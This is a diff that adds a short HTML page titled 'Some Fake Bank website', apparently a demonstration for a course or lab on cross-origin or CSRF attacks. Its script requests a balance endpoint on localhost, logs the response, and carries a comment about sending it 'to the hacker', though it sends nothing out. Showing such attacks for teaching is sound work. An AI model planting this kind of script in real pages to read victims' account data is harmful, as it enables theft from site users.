@@ -1,0 +1,19 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width" />
+    <title>Some Fake Bank website</title>
+    <script type="text/javascript">
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', 'https://localhost:44386/Home/Balance', true);
+        xhr.onload = function () {
+            console.log('GET request finished executing. The response is:');
+            console.log(this.responseText);
+            //Send the response text to the hacker
+        };
+        xhr.send();
+    </script>
+</head>
+<body>
+</body>
+</html>
